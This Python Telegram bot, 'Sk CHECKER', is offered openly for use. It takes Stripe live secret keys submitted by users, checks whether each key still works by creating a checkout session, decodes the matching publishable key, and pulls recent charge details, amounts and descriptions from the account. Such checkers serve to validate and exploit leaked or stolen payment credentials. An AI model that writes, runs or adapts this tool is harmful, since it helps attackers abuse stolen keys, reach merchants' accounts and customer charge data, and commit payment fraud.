import json
import requests
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext
from time import sleep
from urllib.parse import unquote
import base64

API_KEY = "YOUR_TELEGRAM_BOT_API_KEY"
bot = Bot(API_KEY)

def start(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    caption = (
        "<b>Sk CHECKER\n"
        "• Usage: </b><code>/sk sk_live_xxx</code>\n"
        "<b>• Status: ON ✅</b>"
    )
    keyboard = [
        [InlineKeyboardButton("FaresM", url="https://t.me/a_aaq"), InlineKeyboardButton("Group", url="https://t.me/a_aaq")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_photo(chat_id=chat_id, photo="https://t.me/" + update.message.from_user.username, caption=caption, parse_mode="HTML", reply_markup=reply_markup)

def check_sk(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id
    secret_key = update.message.text.split("/sk ", 1)[1]
    
    message = bot.send_message(chat_id=chat_id, text="CHECKING...", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("FarrsM", url="https://t.me/a_aaq"), InlineKeyboardButton("Group", url="https://t.me/a_aaq")]
    ]))

    steps = 10
    time_icons = [
        '🕛', '🕧', '🕐', '🕜', '🕑', '🕝', '🕒', '🕞', '🕓', '🕟', '🕔', '🕠', '🕕', '🕡', '🕖', '🕢', '🕗', '🕣', '🕘', '🕤', '🕙', '🕥', '🕚', '🕦'
    ]
    for i in range(steps + 1):
        progress = '⭕' * i + '⚪️' * (steps - i)
        time_icon = time_icons[i % len(time_icons)]
        message_text = f"{time_icon} Processing... [{progress}] {i * 10}%\n\n"
        message_text += "🔗 Check out our channels:\n"
        message_text += "🔹 <a href=\"https://t.me/a_aaq\">FaresM</a>\n"
        message_text += "🔹 <a href=\"https://t.me/a_aaq\">Group</a>"
        
        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=message_text, parse_mode='HTML')
        sleep(1)

    try:
        pk_result = get_pk(secret_key)
        if "Error creating Checkout Session" in pk_result:
            bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"<b>→ Sk Checker\n→ Result: Dead\n• Key: </b><code>{secret_key}</code>\n→ Checked By: @{update.message.from_user.username} [Free]", parse_mode="HTML")
        else:
            sk_details = get_sk_details(secret_key)
            response = f"<b>→ Sk Checker\n→ 🚺: ⚠️\n\n• Key: </b><code>{sk_details['SK']}</code>\n"
            response += f"<b>• Pk: </b><code>{pk_result}</code>\n"
            response += f"<b>• Currency: </b>{sk_details['currency']}\n"
            response += f"<b>• Available Balance: </b>{sk_details['available_amount']}\n"
            response += f"<b>• Pending Balance: </b>{sk_details['pending_amount']}\n"
            response += f"• Response: Live Key ✅\n"
            response += f"• Users Checked: {sk_details['users']}\n"
            response += f"→Names : {sk_details['lists']}\n\n"
            response += "→ 🔗 Check out our channels:</b>\n"
            response += "🔹 <a href=\"https://t.me/a_aaq\">FaresM</a>\n"
            response += "🔹 <a href=\"https://t.me/a_aaq\">Group</a>\n"
            response += f"<b> Checked By: @{update.message.from_user.username} [Free]</b>"

            bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=response, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"Error checking the key: {e}")

def get_pk(secret_key):
    url = 'https://api.stripe.com/v1/checkout/sessions'
    headers = {'Authorization': f'Bearer {secret_key}'}
    data = {
        'payment_method_types[]': 'card',
        'line_items[][price_data][currency]': 'usd',
        'line_items[][price_data][product_data][name]': 'T-shirt',
        'line_items[][price_data][unit_amount]': 2000,
        'line_items[][quantity]': 1,
        'mode': 'payment',
        'success_url': 'https://your-domain.com/success',
        'cancel_url': 'https://your-domain.com/cancel'
    }
    response = requests.post(url, headers=headers, data=data)
    response_data = response.json()

    if 'url' in response_data:
        obfuscated_pk = unquote(response_data['url'].split("#")[1])
        decoded = base64.b64decode(obfuscated_pk).decode('utf-8')
        deobfuscated = ''.join(chr(5 ^ ord(c)) for c in decoded)
        pk_live = json.loads(deobfuscated)["apiKey"]
        return pk_live
    else:
        raise Exception(response_data.get('error', {}).get('message', 'Unknown error'))

def get_sk_details(secret_key):
    url = 'https://api.stripe.com/v1/charges'
    headers = {'Authorization': f'Bearer {secret_key}'}
    params = {'limit': 15}
    response = requests.get(url, headers=headers, params=params)
    charges = response.json()

    if 'data' in charges:
        charge_count = len(charges['data'])
        descriptions = [charge['description'] for charge in charges['data'] if 'description' in charge]
        currency = charges['data'][0]['currency']
        available_amount = charges['data'][0]['amount']
        pending_amount = charges['data'][0]['amount']
        country = charges['data'][0]['billing_details']['address']['country']
        sk_parts = secret_key.split('_')
        sk_obfuscated = f"sk_live_{sk_parts[2][:5]}•fares•{sk_parts[2][-5:]}"

        return {
            "lists": "\n".join(descriptions),
            "SK": sk_obfuscated,
            "users": charge_count,
            "currency": currency,
            "available_amount": available_amount,
            "pending_amount": pending_amount,
            "country": country
        }
    else:
        raise Exception(charges.get('error', {}).get('message', 'Unknown error'))

def main():
    updater = Updater(API_KEY, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("sk", check_sk))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
